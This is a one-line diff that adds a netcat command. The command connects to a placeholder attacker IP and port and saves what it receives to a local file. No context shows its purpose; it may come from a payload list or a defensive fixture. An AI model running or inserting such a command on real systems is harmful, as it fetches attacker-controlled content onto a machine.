@@ -1,0 +1,1 @@
+nc <attacker_ip> <port> > <file>
